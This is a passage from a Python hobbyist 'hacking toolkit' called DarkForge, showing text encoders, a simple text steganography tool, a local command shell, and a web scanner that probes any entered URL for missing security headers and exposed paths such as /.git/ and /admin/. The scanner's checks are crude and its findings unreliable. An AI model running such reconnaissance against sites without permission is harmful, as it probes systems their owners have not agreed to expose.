            print(f"{Colors.GREEN}[+] Caesar Cipher: {result}{Colors.END}")
            
        elif choice == "3":
            leet_map = {
                'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5',
                't': '7', 'l': '1', 'g': '9', 'b': '6'
            }
            result = ""
            for char in text.lower():
                result += leet_map.get(char, char)
            print(f"{Colors.GREEN}[+] Leetspeak: {result}{Colors.END}")
            
        elif choice == "4":
            result = ' '.join(format(ord(char), '08b') for char in text)
            print(f"{Colors.GREEN}[+] Binary: {result}{Colors.END}")
            
        elif choice == "5":
            morse_map = {
                'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.',
                'f': '..-.', 'g': '--.', 'h': '....', 'i': '..', 'j': '.---',
                'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---',
                'p': '.--.', 'q': '--.-', 'r': '.-.', 's': '...', 't': '-',
                'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-', 'y': '-.--',
                'z': '--..', ' ': '/'
            }
            result = ' '.join(morse_map.get(char.lower(), char) for char in text)
            print(f"{Colors.GREEN}[+] Morse Code: {result}{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def vulnerability_scanner(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║       VULNERABILITY SCANNER          ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        target = input(f"{Colors.YELLOW}[?] Enter target URL: {Colors.END}")
        
        if not target.startswith('http'):
            target = 'http://' + target
            
        self.loading_animation(f"Scanning {target} for vulnerabilities...")
        
        vulnerabilities = []
        
        try:
            response = requests.get(target, timeout=10)
            headers = response.headers
            content = response.text.lower()
            
            if 'server' in headers:
                server = headers['server']
                print(f"{Colors.CYAN}[+] Server: {server}{Colors.END}")
                
                if 'apache' in server.lower():
                    vulnerabilities.append("Apache server detected - check for known CVEs")
                elif 'nginx' in server.lower():
                    vulnerabilities.append("Nginx server detected - check for known CVEs")
                    
            if 'x-powered-by' in headers:
                powered_by = headers['x-powered-by']
                print(f"{Colors.CYAN}[+] Powered by: {powered_by}{Colors.END}")
                vulnerabilities.append(f"Technology disclosure: {powered_by}")
                
            if 'x-frame-options' not in headers:
                vulnerabilities.append("Missing X-Frame-Options header - Clickjacking possible")
                
            if 'x-xss-protection' not in headers:
                vulnerabilities.append("Missing X-XSS-Protection header")
                
            if 'x-content-type-options' not in headers:
                vulnerabilities.append("Missing X-Content-Type-Options header")
                
            if 'strict-transport-security' not in headers and target.startswith('https'):
                vulnerabilities.append("Missing HSTS header")
                
            if 'password' in content and 'type="password"' in content:
                if target.startswith('http://'):
                    vulnerabilities.append("Password form over HTTP - credentials at risk")
                    
            if 'sql' in content or 'mysql' in content or 'oracle' in content:
                vulnerabilities.append("Possible database error disclosure")
                
            if 'debug' in content or 'error' in content:
                vulnerabilities.append("Possible debug/error information disclosure")
                
            common_files = ['/robots.txt', '/sitemap.xml', '/.git/', '/admin/', '/backup/']
            for file_path in common_files:
                try:
                    test_response = requests.get(target + file_path, timeout=5)
                    if test_response.status_code == 200:
                        vulnerabilities.append(f"Accessible file/directory: {file_path}")
                except:
                    pass
                    
        except Exception as e:
            print(f"{Colors.RED}[!] Error scanning target: {str(e)}{Colors.END}")
            
        if vulnerabilities:
            print(f"\n{Colors.RED}[!] Found {len(vulnerabilities)} potential vulnerabilities:{Colors.END}")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"{Colors.YELLOW}[{i}] {vuln}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] No obvious vulnerabilities found{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def steganography(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║           STEGANOGRAPHY              ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        print(f"{Colors.PURPLE}[1] Hide text in text")
        print(f"[2] Extract hidden text")
        print(f"[3] Simple text encoding{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}[?] Select option: {Colors.END}")
        
        if choice == "1":
            message = input(f"{Colors.YELLOW}[?] Enter message to hide: {Colors.END}")
            cover_text = input(f"{Colors.YELLOW}[?] Enter cover text: {Colors.END}")
            
            binary_message = ''.join(format(ord(char), '08b') for char in message)
            binary_message += '1111111111111110'
            
            stego_text = ""
            bit_index = 0
            
            for char in cover_text:
                if bit_index < len(binary_message):
                    if binary_message[bit_index] == '1':
                        stego_text += char.upper() if char.islower() else char
                    else:
                        stego_text += char.lower() if char.isupper() else char
                    bit_index += 1
                else:
                    stego_text += char
                    
            print(f"{Colors.GREEN}[+] Steganographic text: {stego_text}{Colors.END}")
            
        elif choice == "2":
            stego_text = input(f"{Colors.YELLOW}[?] Enter steganographic text: {Colors.END}")
            
            binary_data = ""
            for char in stego_text:
                if char.isupper():
                    binary_data += "1"
                elif char.islower():
                    binary_data += "0"
                    
            message = ""
            for i in range(0, len(binary_data), 8):
                byte = binary_data[i:i+8]
                if len(byte) == 8:
                    char_code = int(byte, 2)
                    if char_code == 254:
                        break
                    message += chr(char_code)
                    
            print(f"{Colors.GREEN}[+] Hidden message: {message}{Colors.END}")
            
        elif choice == "3":
            text = input(f"{Colors.YELLOW}[?] Enter text to encode: {Colors.END}")
            
            encoded = ""
            for char in text:
                encoded += chr(ord(char) + 1)
                
            print(f"{Colors.GREEN}[+] Encoded text: {encoded}{Colors.END}")
            
            decoded = ""
            for char in encoded:
                decoded += chr(ord(char) - 1)
                
            print(f"{Colors.GREEN}[+] Decoded text: {decoded}{Colors.END}")
            
        input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
        
    def terminal_shell(self):
        self.clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
        print(f"║           TERMINAL SHELL             ║")
        print(f"╚══════════════════════════════════════╝{Colors.END}")
        
        print(f"{Colors.YELLOW}[!] Interactive shell - type 'exit' to return{Colors.END}")
        print(f"{Colors.YELLOW}[!] Current directory: {os.getcwd()}{Colors.END}")
        
        while True:
            try:
                command = input(f"{Colors.GREEN}darkforge@shell:~$ {Colors.END}")
                
                if command.lower() in ['exit', 'quit', 'back']:
                    break
                elif command.lower() == 'clear':
                    self.clear_screen()
                    print(f"{Colors.CYAN}╔══════════════════════════════════════╗")
                    print(f"║           TERMINAL SHELL             ║")
                    print(f"╚══════════════════════════════════════╝{Colors.END}")
                elif command.startswith('cd '):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        print(f"{Colors.GREEN}[+] Changed directory to: {os.getcwd()}{Colors.END}")
                    except Exception as e:
                        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
                elif command == 'pwd':
                    print(f"{Colors.CYAN}{os.getcwd()}{Colors.END}")
                elif command == 'whoami':
                    print(f"{Colors.CYAN}{os.getenv('USER', 'unknown')}{Colors.END}")
                elif command:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                        if result.stdout:
                            print(f"{Colors.CYAN}{result.stdout}{Colors.END}")
                        if result.stderr:
                            print(f"{Colors.RED}{result.stderr}{Colors.END}")
                    except subprocess.TimeoutExpired:
                        print(f"{Colors.RED}[!] Command timed out{Colors.END}")
                    except Exception as e:
                        print(f"{Colors.RED}[!] Error executing command: {str(e)}{Colors.END}")
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Use 'exit' to return to main menu{Colors.END}")
            except EOFError:
                break
                
    def exit_program(self):
        self.clear_screen()
        exit_banner = f"""
{Colors.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ████████╗██╗  ██╗ █████╗ ███╗   ██╗██╗  ██╗███████╗        ║
║  ╚══██╔══╝██║  ██║██╔══██╗████╗  ██║██║ ██╔╝██╔════╝        ║
║     ██║   ███████║███████║██╔██╗ ██║█████╔╝ ███████╗        ║
║     ██║   ██╔══██║██╔══██║██║╚██╗██║██╔═██╗ ╚════██║        ║
║     ██║   ██║  ██║██║  ██║██║ ╚████║██║  ██╗███████║        ║
║     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝        ║
║                                                              ║
║              Thanks for using DarkForge!                     ║
║                Stay safe and hack ethically                  ║
║                                                              ║
║                  by: @sentinelzxofc                          ║
║              .com/sentinelzxofc/DarkForge                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(exit_banner)
        time.sleep(2)
        sys.exit(0)

def main():
    try:
        darkforge = DarkForge()
        darkforge.main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal error: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
